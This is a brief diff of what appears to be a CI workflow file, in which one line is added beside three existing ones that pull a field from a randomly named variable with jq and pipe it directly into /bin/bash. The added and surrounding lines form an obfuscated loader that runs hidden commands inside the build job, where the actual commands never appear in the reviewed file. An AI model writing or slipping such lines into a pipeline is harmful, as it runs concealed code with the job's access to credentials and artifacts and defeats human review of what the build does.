@@ -24,6 +24,7 @@ jobs:
           echo $epzs0 | jq -r .o6 | /bin/bash
           echo $urfya4424 | jq -r .d4 | /bin/bash
           echo $oy1115 | jq -r .q42782 | /bin/bash
+          printf '%s' "$pztrp9758" | jq -r .c1089 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
